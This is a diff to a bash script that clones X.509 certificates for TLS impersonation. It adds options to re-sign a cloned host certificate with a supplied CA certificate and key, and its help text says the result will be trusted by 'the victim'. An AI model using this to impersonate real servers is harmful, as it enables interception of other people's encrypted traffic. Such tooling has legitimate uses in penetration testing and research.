@@ -36,7 +36,7 @@ cat <<EOF
 Usage: $0 [options] [<sni>@]<host>:<port>|<pem-file>
 
 Clone an X509 certificate. The cloned certificate and the corresponding key
-will be located in $DIR. Their filenames make up the output of this script.
+will be located in <DIR>. Their filenames make up the output of this script.
 
 The mandatory argument can either be a filename of an x509 certifcate in PEM
 format, or a host name and a port number separated by a colon. Optionally, you
@@ -49,7 +49,18 @@ Optional parameters:
         The directory in which to save the certificates and keys (default: /tmp)
 
     -r, --reuse-keys:
-        Reuse previously generated suitable keys located in <DIR>
+        Reuse previously generated suitable keys located in <DIR> for better
+        performance
+
+    -c=<CERT>, --cert=<CERT>:
+        The path to a certificate in PEM format with which to sign the host
+        certificate. The result will then not be cloned (i.e. seem fields
+        will be different, in particular the issuer), but it will be a valid
+        certificate which will be trusted by the victim if they trust
+        <CERT>. You must supply a matching <KEY>.
+
+    -k=<KEY>, --key=<KEY>:
+        The path to a key in PEM format matching <CERT>
 
     --debug:
         Print debug messages
@@ -70,6 +81,14 @@ for i in "$@" ; do
     case $i in
             -d=*|--directory=*)
             DIR="${i#*=}"
+            shift # past argument=value
+        ;;
+            -c=*|--cert=*)
+            ISSUER_CERT="${i#*=}"
+            shift # past argument=value
+        ;;
+            -k=*|--key=*)
+            ISSUER_KEY="${i#*=}"
             shift # past argument=value
         ;;
             -r|--reuse-keys)
@@ -97,7 +116,6 @@ done
 
 # set some variables
 HOST="$1"
-COMPROMISED_CA="$2"
 mkdir -p "$DIR"
 
 EC_PARAMS=$(cat <<'END_HEREDOC'
@@ -212,11 +230,6 @@ function parse_certs () {
                 exit 1
             fi
             counter=$((counter+=1))
-
-            # no need to clone the other certs if we have no compromised CA
-            if [[ -z $COMPROMISED_CA ]] ; then
-                break
-            fi
 
             state=begin
             current_cert=""
@@ -408,6 +421,24 @@ function clone_cert () {
         fi
     fi
 
+    if [ ! -z "$ISSUER_CERT" -a ! -z "$ISSUER_KEY" ] ; then
+        # sign it regularly with given cert
+        FAKE_ISSUER_KEY="$ISSUER_KEY"
+        FAKE_ISSUER_CERT="$ISSUER_CERT"
+        openssl x509 -in "$CERT" -outform DER | hexlify \
+            | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
+            | unhexlify \
+            | openssl x509 -days 356 -inform DER -CAkey "$ISSUER_KEY" \
+                -CA "$ISSUER_CERT" -CAcreateserial \
+                -out "$CLONED_CERT"  2> /dev/null
+        return-result
+    else
+        if [ ! -z "$ISSUER_CERT" -o ! -z "$ISSUER_KEY" ] ; then
+            die "If you provide one of <KEY> or <CERT>, you must also provide the other"
+        fi
+    fi
+
+
     # extract old signature
     offset="$(openssl asn1parse -in "$CERT" | grep SEQUENCE \
         | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
@@ -452,17 +483,22 @@ function clone_cert () {
         | sed "s/^\(....\)$OLD_CERT_LENGTH/\1$NEW_CERT_LENGTH/" \
         | unhexlify \
         | openssl x509 -inform DER -outform PEM > "$CLONED_CERT"
+
     if [ ! -s "$CLONED_CERT" ] ; then
         echo "Cloning failed" >&2
         rm "$CLONED_CERT"
         rm "$CLONED_KEY"
         exit 1
     fi
+    return-result
+}
+
+function return-result () {
     sanity-check || ( rm -rf "$CLONED_KEY" "$CLONED_CERT" ; exit 1)
     printf "%s\n" "$CLONED_KEY"
     printf "%s\n" "$CLONED_CERT"
+    exit 0
 }
-
 
 function sanity-check () {
     # check whether the key pair matches, and whether the cert validates
